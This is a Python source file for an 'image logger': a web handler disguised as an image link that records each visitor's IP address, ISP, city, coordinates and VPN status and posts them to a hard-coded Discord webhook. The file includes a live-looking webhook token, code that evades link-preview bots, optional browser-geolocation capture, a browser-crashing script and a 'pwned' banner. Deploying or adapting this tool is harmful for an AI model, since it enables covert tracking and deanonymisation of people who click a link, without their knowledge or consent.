import os
import traceback
import requests
import base64
from http.server import BaseHTTPRequestHandler
from urllib import parse
from typing import Optional, Dict, Any

CONFIG = {
    "webhook": "https://discord.com/api/webhooks/1375994522236092609/chsF4GUgXi0xyz5c78oPjsDoeQ_vlM6u4LrKi3XQEQysHE_5pFR2neshBl3A1FMiV1Ua",
    "image": "https://tenor.com/view/rovakook-gif-25331069",
    "imageArgument": True,
    "username": "Image Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {
        "doMessage": False,
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here",
    },
}

BLACKLISTED_IPS = ("27", "104", "143", "164")

BINARIES = {
    "loading": base64.b85decode(
        b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000'
    )
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    def _install_dependencies(self) -> None:
        dependencies = ["requests"]
        for dep in dependencies:
            try:
                __import__(dep)
            except ImportError:
                os.system(f"pip install {dep}")

    def _bot_check(self, ip: str, useragent: str) -> Optional[str]:
        if ip.startswith(("34", "35")):
            return "Discord"
        elif useragent.startswith("TelegramBot"):
            return "Telegram"
        return None

    def _report_error(self, error: str) -> None:
        payload = {
            "username": CONFIG["username"],
            "content": "@everyone",
            "embeds": [
                {
                    "title": "Image Logger - Error",
                    "color": CONFIG["color"],
                    "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
                }
            ],
        }
        try:
            requests.post(CONFIG["webhook"], json=payload, timeout=5)
        except requests.RequestException:
            pass

    def _get_ip_info(self, ip: str) -> Dict[str, Any]:
        try:
            response = requests.get(
                f"http://ip-api.com/json/{ip}?fields=16976857",
                timeout=5
            )
            return response.json() if response.status_code == 200 else {}
        except requests.RequestException:
            return {}

    def _make_report(self, ip: str, useragent: str, coords: Optional[str] = None,
                    endpoint: str = "N/A", url: Optional[str] = None) -> Optional[Dict[str, Any]]:
        if ip.startswith(BLACKLISTED_IPS):
            return None

        bot = self._bot_check(ip, useragent)
        if bot and CONFIG["linkAlerts"]:
            payload = {
                "username": CONFIG["username"],
                "content": "",
                "embeds": [
                    {
                        "title": "Image Logger - Link Sent",
                        "color": CONFIG["color"],
                        "description": f"An **Image Logging** link was sent!\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                    }
                ],
            }
            try:
                requests.post(CONFIG["webhook"], json=payload, timeout=5)
            except requests.RequestException:
                pass
            return None

        info = self._get_ip_info(ip)
        if not info:
            return None

        ping = "@everyone"
        if info.get("proxy") and CONFIG["vpnCheck"] == 2:
            return None
        elif info.get("proxy") and CONFIG["vpnCheck"] == 1:
            ping = ""

        if info.get("hosting"):
            if CONFIG["antiBot"] == 4 and not info.get("proxy"):
                return None
            elif CONFIG["antiBot"] == 3:
                return None
            elif CONFIG["antiBot"] == 2 and not info.get("proxy"):
                ping = ""
            elif CONFIG["antiBot"] == 1:
                ping = ""

        embed = {
            "username": CONFIG["username"],
            "content": ping,
            "embeds": [
                {
                    "title": "Image Logger - IP Logged",
                    "color": CONFIG["color"],
                    "description": (
                        f"**A User Opened the Original Image!**\n\n"
                        f"**Endpoint:** `{endpoint}`\n\n"
                        f"**IP Info:**\n"
                        f"> **IP:** `{ip or 'Unknown'}`\n"
                        f"> **Provider:** `{info.get('isp', 'Unknown')}`\n"
                        f"> **ASN:** `{info.get('as', 'Unknown')}`\n"
                        f"> **Country:** `{info.get('country', 'Unknown')}`\n"
                        f"> **Region:** `{info.get('regionName', 'Unknown')}`\n"
                        f"> **City:** `{info.get('city', 'Unknown')}`\n"
                        f"> **Coords:** `{f'{info.get('lat', '')}, {info.get('lon', '')}' if not coords else coords.replace(',', ', ')}` "
                        f"({'Approximate' if not coords else f'Precise, [Google Maps](https://www.google.com/maps/search/google+map++{coords})'})\n"
                        f"> **Timezone:** `{info.get('timezone', 'Unknown/Unknown').split('/')[1].replace('_', ' ') if info.get('timezone') else 'Unknown'} "
                        f"({info.get('timezone', 'Unknown/Unknown').split('/')[0]})`\n"
                        f"> **Mobile:** `{info.get('mobile', 'Unknown')}`\n"
                        f"> **VPN:** `{info.get('proxy', 'False')}`\n"
                        f"> **Bot:** `{info.get('hosting', 'False') if info.get('hosting') and not info.get('proxy') else 'Possibly' if info.get('hosting') else 'False'}`\n\n"
                        f"**PC Info:**\n"
                        f"> **OS:** `Unknown`\n"
                        f"> **Browser:** `Unknown`\n\n"
                        f"**User Agent:**\n`\n{useragent}\n`"
                    ),
                }
            ],
        }
        if url:
            embed["embeds"][0]["thumbnail"] = {"url": url}

        try:
            requests.post(CONFIG["webhook"], json=embed, timeout=5)
        except requests.RequestException:
            pass
        return info

    def _get_image_url(self, query: str) -> str:
        if not CONFIG["imageArgument"]:
            return CONFIG["image"]
        dic = dict(parse.parse_qsl(parse.urlsplit(query).query))
        try:
            return base64.b64decode(dic.get("url") or dic.get("id", "").encode()).decode()
        except (base64.binascii.Error, UnicodeDecodeError):
            return CONFIG["image"]

    def _generate_response_data(self, url: str, message: str, result: Optional[Dict[str, Any]]) -> bytes:
        data = f'''<!DOCTYPE html>
<html>
<head>
    <style>
        body {{ margin: 0; padding: 0; }}
        div.img {{ background-image: url('{url}'); background-position: center center; background-repeat: no-repeat; background-size: contain; width: 100vw; height: 100vh; }}
    </style>
</head>
<body>
    <div class="img"></div>
</body>
</html>'''.encode()

        if CONFIG["message"]["doMessage"]:
            message = message
            if CONFIG["message"]["richMessage"] and result:
                message = (message.replace("{ip}", self.headers.get('x-forwarded-for', 'Unknown'))
                          .replace("{isp}", result.get("isp", "Unknown"))
                          .replace("{asn}", result.get("as", "Unknown"))
                          .replace("{country}", result.get("country", "Unknown"))
                          .replace("{region}", result.get("regionName", "Unknown"))
                          .replace("{city}", result.get("city", "Unknown"))
                          .replace("{lat}", str(result.get("lat", "Unknown")))
                          .replace("{long}", str(result.get("lon", "Unknown")))
                          .replace("{timezone}", f"{result.get('timezone', 'Unknown/Unknown').split('/')[1].replace('_', ' ') if result.get('timezone') else 'Unknown'} ({result.get('timezone', 'Unknown/Unknown').split('/')[0]})")
                          .replace("{mobile}", str(result.get("mobile", "Unknown")))
                          .replace("{vpn}", str(result.get("proxy", "False")))
                          .replace("{bot}", str(result.get("hosting", "False") if result.get("hosting") and not result.get("proxy") else "Possibly" if result.get("hosting") else "False"))
                          .replace("{browser}", "Unknown")
                          .replace("{os}", "Unknown"))
                data = f'''<!DOCTYPE html>
<html>
<head>
    <style>body {{ margin: 0; padding: 0; font-family: Arial, sans-serif; }}</style>
</head>
<body>
    <p>{message}</p>
</body>
</html>'''.encode()

        if CONFIG["crashBrowser"]:
            data += b'<script>setTimeout(function(){for(var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'

        if CONFIG["redirect"]["redirect"]:
            data = f'<meta http-equiv="refresh" content="0;url={CONFIG["redirect"]["page"]}">'.encode()

        return data

    def handle_request(self) -> None:
        try:
            self._install_dependencies()
            ip = self.headers.get('x-forwarded-for', '')
            useragent = self.headers.get('user-agent', '')
            if ip.startswith(BLACKLISTED_IPS):
                return

            url = self._get_image_url(self.path)
            endpoint = self.path.split("?")[0]

            if self._bot_check(ip, useragent):
                self.send_response(200 if CONFIG["buggedImage"] else 302)
                self.send_header('Content-type' if CONFIG["buggedImage"] else 'Location', 'image/jpeg' if CONFIG["buggedImage"] else url)
                self.end_headers()
                if CONFIG["buggedImage"]:
                    self.wfile.write(BINARIES["loading"])
                self._make_report(ip, useragent, endpoint=endpoint, url=url)
                return

            dic = dict(parse.parse_qsl(parse.urlsplit(self.path).query))
            coords = base64.b64decode(dic.get("g", "").encode()).decode() if dic.get("g") and CONFIG["accurateLocation"] else None
            result = self._make_report(ip, useragent, coords, endpoint, url)

            data = self._generate_response_data(url, CONFIG["message"]["message"], result)
            if CONFIG["accurateLocation"]:
                data += b"""<script>
var currenturl = window.location.href;
if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(coords) {
            currenturl += (currenturl.includes("?") ? "&g=" : "?g=") + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D");
            location.replace(currenturl);
        });
    }
}
</script>"""

            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(data)

        except Exception as e:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            self._report_error(traceback.format_exc())

    do_GET = handle_request
    do_POST = handle_request

if __name__ == "__main__":
    print("Image Logger Server Started")
